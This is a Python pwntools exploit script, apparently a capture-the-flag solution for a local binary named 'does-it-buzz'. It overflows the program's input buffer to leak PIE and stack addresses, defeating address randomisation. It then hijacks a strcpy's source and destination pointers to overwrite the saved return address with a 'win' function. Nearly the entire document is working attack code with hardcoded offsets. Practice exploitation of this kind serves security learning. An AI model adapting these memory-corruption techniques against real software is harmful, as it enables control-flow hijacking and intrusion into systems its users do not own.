#!/usr/bin/python3

from pwn import *
import os

context.log_level = 'error'
context.arch = 'amd64'

elf = context.binary = ELF("./does-it-buzz")

# Your code here
rbp = 0x7ffd241c7200 
input_start = rbp - 0x70 + 0x14
counter_add = rbp - 0x24
strcpy_src = rbp - 0x20
strcpy_dest = rbp - 0x18
canary_add = rbp - 8
ret_add = rbp + 8
buzz_add = rbp - 0x2c
win_base = 0x00000000000012c9
offset_from_buzz_to_ret = ret_add - buzz_add
offset_from_input_to_buzz = buzz_add - input_start - 1 # minus 1 because first byte is always null which we do not need

def get_pie_address(io):
    io.recvuntil(b"Fizz Buzz!\n")
    payload = cyclic(counter_add - input_start) + b"\xff" * 4
    io.send(payload)
    io.recvuntil(b"0:")
    data = io.recvuntil(b"0:")
    bytes = data[len(payload) + 14:len(payload) + 20]
    pie = int.from_bytes(bytes,"little")
    return io, pie

def get_stack_add(io):
    payload = cyclic(counter_add - input_start) + b"\xff" * 4
    io.send(payload)
    data = io.recvuntil(b"0:")
    bytes = data[len(payload) + 14:len(payload) + 20]
    stack = int.from_bytes(bytes,"little")
    return io, stack

def run_until_5(io):
    for i in range(5):
        io.sendline(b"null")
        print(io.recvuntil(str((i+1)).encode()+b":"))
    return io

io = process()

#get leaked pie address
io , pie = get_pie_address(io)

#calculate base address of pie
pie_base = pie - 0x4098

#run until strcpy src address is stack address
io = run_until_5(io)

#get the leaked stacked address
io , stack = get_stack_add(io)

#send the payload which write the strcpy src to the input buffer address which contain win function address
#and the destination address with the rbp+8 which is ret address which i calculate using some offset and that leaked stack
payload = b"\x00" + p64(pie_base + win_base) + cyclic(strcpy_src - input_start - 9) + p64(stack - offset_from_input_to_buzz) + pack(stack + offset_from_buzz_to_ret)
io.send(payload)

print(io.recvall().decode('latin-1'))
